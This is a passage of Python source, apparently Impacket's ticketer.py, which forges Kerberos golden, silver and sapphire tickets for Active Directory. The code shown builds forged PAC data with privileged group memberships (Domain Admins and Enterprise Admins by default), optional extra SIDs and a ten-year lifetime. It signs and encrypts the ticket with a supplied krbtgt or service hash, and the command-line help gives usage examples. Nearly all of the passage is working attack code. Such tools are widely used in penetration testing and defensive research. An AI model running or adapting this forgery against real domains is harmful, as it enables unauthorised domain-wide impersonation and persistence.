            encTicketPart['cname'] = noValue
            encTicketPart['cname']['name-type'] = PrincipalNameType.NT_PRINCIPAL.value
            encTicketPart['cname']['name-string'] = noValue
            encTicketPart['cname']['name-string'][0] = self.__target

            encTicketPart['transited'] = noValue
            encTicketPart['transited']['tr-type'] = 0
            encTicketPart['transited']['contents'] = ''
            encTicketPart['authtime'] = KerberosTime.to_asn1(datetime.datetime.now(datetime.timezone.utc))
            encTicketPart['starttime'] = KerberosTime.to_asn1(datetime.datetime.now(datetime.timezone.utc))
            # Let's extend the ticket's validity a lil bit
            encTicketPart['endtime'] = KerberosTime.to_asn1(ticketDuration)
            encTicketPart['renew-till'] = KerberosTime.to_asn1(ticketDuration)
            encTicketPart['authorization-data'] = noValue
            encTicketPart['authorization-data'][0] = noValue
            encTicketPart['authorization-data'][0]['ad-type'] = AuthorizationDataType.AD_IF_RELEVANT.value
            encTicketPart['authorization-data'][0]['ad-data'] = noValue

            # Let's locate the KERB_VALIDATION_INFO and Checksums
            if PAC_LOGON_INFO in pacInfos:
                data = pacInfos[PAC_LOGON_INFO]
                validationInfo = VALIDATION_INFO()
                validationInfo.fromString(pacInfos[PAC_LOGON_INFO])
                lenVal = len(validationInfo.getData())
                validationInfo.fromStringReferents(data, lenVal)

                aTime = timegm(strptime(str(encTicketPart['authtime']), '%Y%m%d%H%M%SZ'))

                unixTime = self.getFileTime(aTime)

                kerbdata = KERB_VALIDATION_INFO()

                kerbdata['LogonTime']['dwLowDateTime'] = unixTime & 0xffffffff
                kerbdata['LogonTime']['dwHighDateTime'] = unixTime >> 32

                # Let's adjust username and other data
                validationInfo['Data']['LogonDomainName'] = self.__domain.upper()
                validationInfo['Data']['EffectiveName'] = self.__target
                # Our Golden Well-known groups! :)
                groups = self.__options.groups.split(',')
                validationInfo['Data']['GroupIds'] = list()
                validationInfo['Data']['GroupCount'] = len(groups)

                for group in groups:
                    groupMembership = GROUP_MEMBERSHIP()
                    groupId = NDRULONG()
                    groupId['Data'] = int(group)
                    groupMembership['RelativeId'] = groupId
                    groupMembership['Attributes'] = SE_GROUP_MANDATORY | SE_GROUP_ENABLED_BY_DEFAULT | SE_GROUP_ENABLED
                    validationInfo['Data']['GroupIds'].append(groupMembership)

                # Let's add the extraSid
                if self.__options.extra_sid is not None:
                    extrasids = self.__options.extra_sid.split(',')
                    if validationInfo['Data']['SidCount'] == 0:
                        # Let's be sure user's flag specify we have extra sids.
                        validationInfo['Data']['UserFlags'] |= 0x20
                        validationInfo['Data']['ExtraSids'] = PKERB_SID_AND_ATTRIBUTES_ARRAY()
                    for extrasid in extrasids:
                        validationInfo['Data']['SidCount'] += 1

                        sidRecord = KERB_SID_AND_ATTRIBUTES()

                        sid = RPC_SID()
                        sid.fromCanonical(extrasid)

                        sidRecord['Sid'] = sid
                        sidRecord['Attributes'] = SE_GROUP_MANDATORY | SE_GROUP_ENABLED_BY_DEFAULT | SE_GROUP_ENABLED

                        # And, let's append the magicSid
                        validationInfo['Data']['ExtraSids'].append(sidRecord)
                else:
                    validationInfo['Data']['ExtraSids'] = NULL

                validationInfoBlob  = validationInfo.getData() + validationInfo.getDataReferents()
                pacInfos[PAC_LOGON_INFO] = validationInfoBlob

                if logging.getLogger().level == logging.DEBUG:
                    logging.debug('VALIDATION_INFO after making it gold')
                    validationInfo.dump()
                    print('\n')
            else:
                raise Exception('PAC_LOGON_INFO not found! Aborting')

            logging.info('\tPAC_LOGON_INFO')

            # Let's now clear the checksums
            if PAC_SERVER_CHECKSUM in pacInfos:
                serverChecksum = PAC_SIGNATURE_DATA(pacInfos[PAC_SERVER_CHECKSUM])
                if serverChecksum['SignatureType'] == ChecksumTypes.hmac_sha1_96_aes256.value:
                    serverChecksum['Signature'] = '\x00' * 12
                elif serverChecksum['SignatureType'] == ChecksumTypes.hmac_sha1_96_aes128.value:
                    serverChecksum['Signature'] = '\x00' * 12
                else:
                    serverChecksum['Signature'] = '\x00' * 16
                pacInfos[PAC_SERVER_CHECKSUM] = serverChecksum.getData()
            else:
                raise Exception('PAC_SERVER_CHECKSUM not found! Aborting')

            if PAC_PRIVSVR_CHECKSUM in pacInfos:
                privSvrChecksum = PAC_SIGNATURE_DATA(pacInfos[PAC_PRIVSVR_CHECKSUM])
                privSvrChecksum['Signature'] = '\x00' * 12
                if privSvrChecksum['SignatureType'] == ChecksumTypes.hmac_sha1_96_aes256.value:
                    privSvrChecksum['Signature'] = '\x00' * 12
                elif privSvrChecksum['SignatureType'] == ChecksumTypes.hmac_sha1_96_aes128.value:
                    privSvrChecksum['Signature'] = '\x00' * 12
                else:
                    privSvrChecksum['Signature'] = '\x00' * 16
                pacInfos[PAC_PRIVSVR_CHECKSUM] = privSvrChecksum.getData()
            else:
                raise Exception('PAC_PRIVSVR_CHECKSUM not found! Aborting')

            if PAC_CLIENT_INFO_TYPE in pacInfos:
                pacClientInfo = PAC_CLIENT_INFO(pacInfos[PAC_CLIENT_INFO_TYPE])
                pacClientInfo['ClientId'] = unixTime
                pacInfos[PAC_CLIENT_INFO_TYPE] = pacClientInfo.getData()
            else:
                raise Exception('PAC_CLIENT_INFO_TYPE not found! Aborting')

            logging.info('\tPAC_CLIENT_INFO_TYPE')
            logging.info('\tEncTicketPart')

        if self.__domain == self.__server:
            encRepPart = EncASRepPart()
        else:
            encRepPart = EncTGSRepPart()

        encRepPart['key'] = noValue
        encRepPart['key']['keytype'] = encTicketPart['key']['keytype']
        encRepPart['key']['keyvalue'] = encTicketPart['key']['keyvalue']
        encRepPart['last-req'] = noValue
        encRepPart['last-req'][0] = noValue
        encRepPart['last-req'][0]['lr-type'] = 0
        encRepPart['last-req'][0]['lr-value'] = KerberosTime.to_asn1(datetime.datetime.now(datetime.timezone.utc))
        encRepPart['nonce'] = 123456789
        encRepPart['key-expiration'] = KerberosTime.to_asn1(ticketDuration)
        flags = []
        for i in encTicketPart['flags']:
            flags.append(i)
        encRepPart['flags'] = flags
        encRepPart['authtime'] = str(encTicketPart['authtime'])
        encRepPart['endtime'] = str(encTicketPart['endtime'])
        encRepPart['starttime'] = str(encTicketPart['starttime'])
        encRepPart['renew-till'] = str(encTicketPart['renew-till'])
        encRepPart['srealm'] = self.__domain.upper()
        encRepPart['sname'] = noValue
        encRepPart['sname']['name-string'] = noValue
        encRepPart['sname']['name-string'][0] = self.__service

        if self.__domain == self.__server:
            encRepPart['sname']['name-type'] = PrincipalNameType.NT_SRV_INST.value
            encRepPart['sname']['name-string'][1] = self.__domain.upper()
            logging.info('\tEncAsRepPart')
        else:
            encRepPart['sname']['name-type'] = PrincipalNameType.NT_PRINCIPAL.value
            encRepPart['sname']['name-string'][1] = self.__server
            logging.info('\tEncTGSRepPart')
        return encRepPart, encTicketPart, pacInfos

    def signEncryptTicket(self, kdcRep, encASorTGSRepPart, encTicketPart, pacInfos):
        logging.info('Signing/Encrypting final ticket')

        # Basic PAC count
        pac_count = 4

        # We changed everything we needed to make us special. Now let's repack and calculate checksums
        validationInfoBlob = pacInfos[PAC_LOGON_INFO]
        validationInfoAlignment = b'\x00' * self.getPadLength(len(validationInfoBlob))

        pacClientInfoBlob = pacInfos[PAC_CLIENT_INFO_TYPE]
        pacClientInfoAlignment = b'\x00' * self.getPadLength(len(pacClientInfoBlob))

        pacUpnDnsInfoBlob = None
        pacUpnDnsInfoAlignment = None
        if PAC_UPN_DNS_INFO in pacInfos:
            pac_count += 1
            pacUpnDnsInfoBlob = pacInfos[PAC_UPN_DNS_INFO]
            pacUpnDnsInfoAlignment = b'\x00' * self.getPadLength(len(pacUpnDnsInfoBlob))

        pacAttributesInfoBlob = None
        pacAttributesInfoAlignment = None
        if PAC_ATTRIBUTES_INFO in pacInfos:
            pac_count += 1
            pacAttributesInfoBlob = pacInfos[PAC_ATTRIBUTES_INFO]
            pacAttributesInfoAlignment = b'\x00' * self.getPadLength(len(pacAttributesInfoBlob))

        pacRequestorInfoBlob = None
        pacRequestorInfoAlignment = None
        if PAC_REQUESTOR_INFO in pacInfos:
            pac_count += 1
            pacRequestorInfoBlob = pacInfos[PAC_REQUESTOR_INFO]
            pacRequestorInfoAlignment = b'\x00' * self.getPadLength(len(pacRequestorInfoBlob))

        serverChecksum = PAC_SIGNATURE_DATA(pacInfos[PAC_SERVER_CHECKSUM])
        serverChecksumBlob = pacInfos[PAC_SERVER_CHECKSUM]
        serverChecksumAlignment = b'\x00' * self.getPadLength(len(serverChecksumBlob))

        privSvrChecksum = PAC_SIGNATURE_DATA(pacInfos[PAC_PRIVSVR_CHECKSUM])
        privSvrChecksumBlob = pacInfos[PAC_PRIVSVR_CHECKSUM]
        privSvrChecksumAlignment = b'\x00' * self.getPadLength(len(privSvrChecksumBlob))

        # The offset are set from the beginning of the PAC_TYPE
        # [MS-PAC] 2.4 PAC_INFO_BUFFER
        offsetData = 8 + len(PAC_INFO_BUFFER().getData()) * pac_count

        # Let's build the PAC_INFO_BUFFER for each one of the elements
        validationInfoIB = PAC_INFO_BUFFER()
        validationInfoIB['ulType'] = PAC_LOGON_INFO
        validationInfoIB['cbBufferSize'] = len(validationInfoBlob)
        validationInfoIB['Offset'] = offsetData
        offsetData = self.getBlockLength(offsetData + validationInfoIB['cbBufferSize'])

        pacClientInfoIB = PAC_INFO_BUFFER()
        pacClientInfoIB['ulType'] = PAC_CLIENT_INFO_TYPE
        pacClientInfoIB['cbBufferSize'] = len(pacClientInfoBlob)
        pacClientInfoIB['Offset'] = offsetData
        offsetData = self.getBlockLength(offsetData + pacClientInfoIB['cbBufferSize'])

        pacUpnDnsInfoIB = None
        if pacUpnDnsInfoBlob is not None:
            pacUpnDnsInfoIB = PAC_INFO_BUFFER()
            pacUpnDnsInfoIB['ulType'] = PAC_UPN_DNS_INFO
            pacUpnDnsInfoIB['cbBufferSize'] = len(pacUpnDnsInfoBlob)
            pacUpnDnsInfoIB['Offset'] = offsetData
            offsetData = self.getBlockLength(offsetData + pacUpnDnsInfoIB['cbBufferSize'])

        pacAttributesInfoIB = None
        if pacAttributesInfoBlob is not None:
            pacAttributesInfoIB = PAC_INFO_BUFFER()
            pacAttributesInfoIB['ulType'] = PAC_ATTRIBUTES_INFO
            pacAttributesInfoIB['cbBufferSize'] = len(pacAttributesInfoBlob)
            pacAttributesInfoIB['Offset'] = offsetData
            offsetData = self.getBlockLength(offsetData + pacAttributesInfoIB['cbBufferSize'])

        pacRequestorInfoIB = None
        if pacRequestorInfoBlob is not None:
            pacRequestorInfoIB = PAC_INFO_BUFFER()
            pacRequestorInfoIB['ulType'] = PAC_REQUESTOR_INFO
            pacRequestorInfoIB['cbBufferSize'] = len(pacRequestorInfoBlob)
            pacRequestorInfoIB['Offset'] = offsetData
            offsetData = self.getBlockLength(offsetData + pacRequestorInfoIB['cbBufferSize'])

        serverChecksumIB = PAC_INFO_BUFFER()
        serverChecksumIB['ulType'] = PAC_SERVER_CHECKSUM
        serverChecksumIB['cbBufferSize'] = len(serverChecksumBlob)
        serverChecksumIB['Offset'] = offsetData
        offsetData = self.getBlockLength(offsetData + serverChecksumIB['cbBufferSize'])

        privSvrChecksumIB = PAC_INFO_BUFFER()
        privSvrChecksumIB['ulType'] = PAC_PRIVSVR_CHECKSUM
        privSvrChecksumIB['cbBufferSize'] = len(privSvrChecksumBlob)
        privSvrChecksumIB['Offset'] = offsetData
        # offsetData = self.getBlockLength(offsetData+privSvrChecksumIB['cbBufferSize'])

        # Building the PAC_TYPE as specified in [MS-PAC]
        buffers = validationInfoIB.getData() + pacClientInfoIB.getData()
        if pacUpnDnsInfoIB is not None:
            buffers += pacUpnDnsInfoIB.getData()
        if pacAttributesInfoIB is not None:
            buffers += pacAttributesInfoIB.getData()
        if pacRequestorInfoIB is not None:
            buffers += pacRequestorInfoIB.getData()

        buffers += serverChecksumIB.getData() + privSvrChecksumIB.getData() + validationInfoBlob + \
            validationInfoAlignment + pacInfos[PAC_CLIENT_INFO_TYPE] + pacClientInfoAlignment
        if pacUpnDnsInfoIB is not None:
            buffers += pacUpnDnsInfoBlob + pacUpnDnsInfoAlignment
        if pacAttributesInfoIB is not None:
            buffers += pacAttributesInfoBlob + pacAttributesInfoAlignment
        if pacRequestorInfoIB is not None:
            buffers += pacRequestorInfoBlob + pacRequestorInfoAlignment

        buffersTail = serverChecksumBlob + serverChecksumAlignment + privSvrChecksum.getData() + privSvrChecksumAlignment

        pacType = PACTYPE()
        pacType['cBuffers'] = pac_count
        pacType['Version'] = 0
        pacType['Buffers'] = buffers + buffersTail

        blobToChecksum = pacType.getData()

        checkSumFunctionServer = _checksum_table[serverChecksum['SignatureType']]
        if serverChecksum['SignatureType'] == ChecksumTypes.hmac_sha1_96_aes256.value:
            keyServer = Key(Enctype.AES256, unhexlify(self.__options.aesKey))
        elif serverChecksum['SignatureType'] == ChecksumTypes.hmac_sha1_96_aes128.value:
            keyServer = Key(Enctype.AES128, unhexlify(self.__options.aesKey))
        elif serverChecksum['SignatureType'] == ChecksumTypes.hmac_md5.value:
            keyServer = Key(Enctype.RC4, unhexlify(self.__options.nthash))
        else:
            raise Exception('Invalid Server checksum type 0x%x' % serverChecksum['SignatureType'])

        checkSumFunctionPriv = _checksum_table[privSvrChecksum['SignatureType']]
        if privSvrChecksum['SignatureType'] == ChecksumTypes.hmac_sha1_96_aes256.value:
            keyPriv = Key(Enctype.AES256, unhexlify(self.__options.aesKey))
        elif privSvrChecksum['SignatureType'] == ChecksumTypes.hmac_sha1_96_aes128.value:
            keyPriv = Key(Enctype.AES128, unhexlify(self.__options.aesKey))
        elif privSvrChecksum['SignatureType'] == ChecksumTypes.hmac_md5.value:
            keyPriv = Key(Enctype.RC4, unhexlify(self.__options.nthash))
        else:
            raise Exception('Invalid Priv checksum type 0x%x' % serverChecksum['SignatureType'])

        serverChecksum['Signature'] = checkSumFunctionServer.checksum(keyServer, KERB_NON_KERB_CKSUM_SALT, blobToChecksum)
        logging.info('\tPAC_SERVER_CHECKSUM')
        privSvrChecksum['Signature'] = checkSumFunctionPriv.checksum(keyPriv, KERB_NON_KERB_CKSUM_SALT, serverChecksum['Signature'])
        logging.info('\tPAC_PRIVSVR_CHECKSUM')

        buffersTail = serverChecksum.getData() + serverChecksumAlignment + privSvrChecksum.getData() + privSvrChecksumAlignment
        pacType['Buffers'] = buffers + buffersTail

        authorizationData = AuthorizationData()
        authorizationData[0] = noValue
        authorizationData[0]['ad-type'] = AuthorizationDataType.AD_WIN2K_PAC.value
        authorizationData[0]['ad-data'] = pacType.getData()
        authorizationData = encoder.encode(authorizationData)

        encTicketPart['authorization-data'][0]['ad-data'] = authorizationData

        if logging.getLogger().level == logging.DEBUG:
            logging.debug('Customized EncTicketPart')
            print(encTicketPart.prettyPrint())
            print('\n')

        encodedEncTicketPart = encoder.encode(encTicketPart)

        cipher = _enctype_table[kdcRep['ticket']['enc-part']['etype']]
        if cipher.enctype == EncryptionTypes.aes256_cts_hmac_sha1_96.value:
            key = Key(cipher.enctype, unhexlify(self.__options.aesKey))
        elif cipher.enctype == EncryptionTypes.aes128_cts_hmac_sha1_96.value:
            key = Key(cipher.enctype, unhexlify(self.__options.aesKey))
        elif cipher.enctype == EncryptionTypes.rc4_hmac.value:
            key = Key(cipher.enctype, unhexlify(self.__options.nthash))
        else:
            raise Exception('Unsupported enctype 0x%x' % cipher.enctype)

        # Key Usage 2
        # AS-REP Ticket and TGS-REP Ticket (includes TGS session
        # key or application session key), encrypted with the
        # service key (Section 5.3)
        logging.info('\tEncTicketPart')
        cipherText = cipher.encrypt(key, 2, encodedEncTicketPart, None)

        kdcRep['ticket']['enc-part']['cipher'] = cipherText
        kdcRep['ticket']['enc-part']['kvno'] = 2

        # Lastly.. we have to encrypt the kdcRep['enc-part'] part
        # with a key we chose. It actually doesn't really matter since nobody uses it (could it be trash?)
        encodedEncASRepPart = encoder.encode(encASorTGSRepPart)

        if self.__domain == self.__server:
            # Key Usage 3
            # AS-REP encrypted part (includes TGS session key or
            # application session key), encrypted with the client key
            # (Section 5.4.2)
            sessionKey = Key(cipher.enctype, encASorTGSRepPart['key']['keyvalue'].asOctets())
            logging.info('\tEncASRepPart')
            cipherText = cipher.encrypt(sessionKey, 3, encodedEncASRepPart, None)
        else:
            # Key Usage 8
            # TGS-REP encrypted part (includes application session
            # key), encrypted with the TGS session key
            # (Section 5.4.2)
            sessionKey = Key(cipher.enctype, encASorTGSRepPart['key']['keyvalue'].asOctets())
            logging.info('\tEncTGSRepPart')
            cipherText = cipher.encrypt(sessionKey, 8, encodedEncASRepPart, None)

        kdcRep['enc-part']['cipher'] = cipherText
        kdcRep['enc-part']['etype'] = cipher.enctype
        kdcRep['enc-part']['kvno'] = 1

        if logging.getLogger().level == logging.DEBUG:
            logging.debug('Final Golden Ticket')
            print(kdcRep.prettyPrint())
            print('\n')

        return encoder.encode(kdcRep), cipher, sessionKey

    def saveTicket(self, ticket, sessionKey):
        logging.info('Saving ticket in %s' % (self.__target.replace('/', '.') + '.ccache'))
        from impacket.krb5.ccache import CCache
        ccache = CCache()

        if self.__server == self.__domain:
            ccache.fromTGT(ticket, sessionKey, sessionKey)
        else:
            ccache.fromTGS(ticket, sessionKey, sessionKey)
        ccache.saveFile(self.__target.replace('/','.') + '.ccache')

    def run(self):
        ticket, adIfRelevant = self.createBasicTicket()
        if ticket is not None:
            encASorTGSRepPart, encTicketPart, pacInfos = self.customizeTicket(ticket, adIfRelevant)
            ticket, cipher, sessionKey = self.signEncryptTicket(ticket, encASorTGSRepPart, encTicketPart, pacInfos)
            self.saveTicket(ticket, sessionKey)

if __name__ == '__main__':
    print(version.BANNER)

    parser = argparse.ArgumentParser(add_help=True, description="Creates a Kerberos golden/silver tickets based on "
                                                                "user options")
    parser.add_argument('target', action='store', help='username for the newly created ticket')
    parser.add_argument('-spn', action="store", help='SPN (service/server) of the target service the silver ticket will'
                                                     ' be generated for. if omitted, golden ticket will be created')
    parser.add_argument('-request', action='store_true', default=False, help='Requests ticket to domain and clones it '
                        'changing only the supplied information. It requires specifying -user')
    parser.add_argument('-domain', action='store', required=True, help='the fully qualified domain name (e.g. contoso.com)')
    parser.add_argument('-domain-sid', action='store', required=True, help='Domain SID of the target domain the ticker will be '
                                                            'generated for')
    parser.add_argument('-aesKey', action="store", metavar = "hex key", help='AES key used for signing the ticket '
                                                                             '(128 or 256 bits)')
    parser.add_argument('-nthash', action="store", help='NT hash used for signing the ticket')
    parser.add_argument('-keytab', action="store", help='Read keys for SPN from keytab file (silver ticket only)')
    parser.add_argument('-groups', action="store", default = '513, 512, 520, 518, 519', help='comma separated list of '
                        'groups user will belong to (default = 513, 512, 520, 518, 519)')
    parser.add_argument('-user-id', action="store", default = '500', help='user id for the user the ticket will be '
                                                                          'created for (default = 500)')
    parser.add_argument('-extra-sid', action="store", help='Comma separated list of ExtraSids to be included inside the ticket\'s PAC')
    parser.add_argument('-extra-pac', action='store_true', help='Populate your ticket with extra PAC (UPN_DNS)')
    parser.add_argument('-old-pac', action='store_true', help='Use the old PAC structure to create your ticket (exclude '
                                                              'PAC_ATTRIBUTES_INFO and PAC_REQUESTOR')
    parser.add_argument('-duration', action="store", default = '87600', help='Amount of hours till the ticket expires '
                                                                             '(default = 24*365*10)')
    parser.add_argument('-ts', action='store_true', help='Adds timestamp to every logging output')
    parser.add_argument('-debug', action='store_true', help='Turn DEBUG output ON')

    group = parser.add_argument_group('authentication')

    group.add_argument('-user', action="store", help='domain/username to be used if -request is chosen (it can be '
                                                     'different from domain/username')
    group.add_argument('-password', action="store", help='password for domain/username')
    group.add_argument('-hashes', action="store", metavar = "LMHASH:NTHASH", help='NTLM hashes, format is LMHASH:NTHASH')
    group.add_argument('-dc-ip', action='store',metavar = "ip address",  help='IP Address of the domain controller. If '
                       'ommited it use the domain part (FQDN) specified in the target parameter')
    parser.add_argument('-impersonate', action="store", help='Sapphire ticket. target username that will be impersonated (through S4U2Self+U2U)'
                                                             ' for querying the ST and extracting the PAC, which will be'
                                                             ' included in the new ticket')

    if len(sys.argv)==1:
        parser.print_help()
        print("\nExamples: ")
        print("\t./ticketer.py -nthash <krbtgt/service nthash> -domain-sid <your domain SID> -domain <your domain FQDN> baduser\n")
        print("\twill create and save a golden ticket for user 'baduser' that will be all encrypted/signed used RC4.")
        print("\tIf you specify -aesKey instead of -ntHash everything will be encrypted using AES128 or AES256")
        print("\t(depending on the key specified). No traffic is generated against the KDC. Ticket will be saved as")
        print("\tbaduser.ccache.\n")
        print("\t./ticketer.py -nthash <krbtgt/service nthash> -aesKey <krbtgt/service AES> -domain-sid <your domain SID> -domain " 
              "<your domain FQDN> -request -user <a valid domain user> -password <valid domain user's password> baduser\n")
        print("\twill first authenticate against the KDC (using -user/-password) and get a TGT that will be used")
        print("\tas template for customization. Whatever encryption algorithms used on that ticket will be honored,")
        print("\thence you might need to specify both -nthash and -aesKey data. Ticket will be generated for 'baduser'")
        print("\tand saved as baduser.ccache")
        sys.exit(1)

    options = parser.parse_args()

    # Init the example's logger theme
    logger.init(options.ts, options.debug)

    if options.domain is None:
        logging.critical('Domain should be specified!')
        sys.exit(1)

    if options.aesKey is None and options.nthash is None and options.keytab is None:
        logging.error('You have to specify either aesKey, or nthash, or keytab')
        sys.exit(1)

    if options.aesKey is not None and options.nthash is not None and options.request is False:
        logging.error('You cannot specify both -aesKey and -nthash w/o using -request. Pick only one')
        sys.exit(1)

    if options.request is True and options.user is None:
        logging.error('-request parameter needs -user to be specified')
        sys.exit(1)

    if options.request is True and options.hashes is None and options.password is None:
        from getpass import getpass
        password = getpass("Password:")
    else:
        password = options.password

    if options.impersonate:
        # args that can't be None: -aesKey, -domain-sid, -nthash, -request, -domain, -user, -password
        # -user-id can't be None except if -old-pac is set
        # args that can't be False: -request
        missing_params = [
            param_name
            for (param, param_name) in
            zip(
                [
                    options.request,
                    options.aesKey, options.nthash,
                    options.domain, options.user, options.password,
                    options.domain_sid, options.user_id
                ],
                [
                    "-request",
                    "-aesKey", "-nthash",
                    "-domain", "-user", "-password",
                    "-domain-sid", "-user-id"
                ]
            )
            if param is None or (param_name == "-request" and not param)
        ]
        if missing_params:
            logging.error(f"missing parameters to do sapphire ticket : {', '.join(missing_params)}")
            sys.exit(1)
        if not options.old_pac and not options.user_id:
            logging.error(f"missing parameter -user-id. Must be set if not doing -old-pac")
            sys.exit(1)
        # ignored params: -extra-pac, -extra-sid, -groups, -duration
        # -user-id ignored if -old-pac
        ignored_params = []
        if options.extra_pac: ignored_params.append("-extra-pac")
        if options.extra_sid is not None: ignored_params.append("-extra-sid")
        if options.groups is not None: ignored_params.append("-groups")
        if options.duration is not None: ignored_params.append("-duration")
        if ignored_params:
            logging.error(f"doing sapphire ticket, ignoring following parameters : {', '.join(ignored_params)}")
        if options.old_pac and options.user_id is not None:
            logging.error(f"parameter -user-id will be ignored when specifying -old-pac in a sapphire ticket attack")

    try:
        executer = TICKETER(options.target, password, options.domain, options)
        executer.run()
    except Exception as e:
        if logging.getLogger().level == logging.DEBUG:
            import traceback
            traceback.print_exc()
        print(str(e))
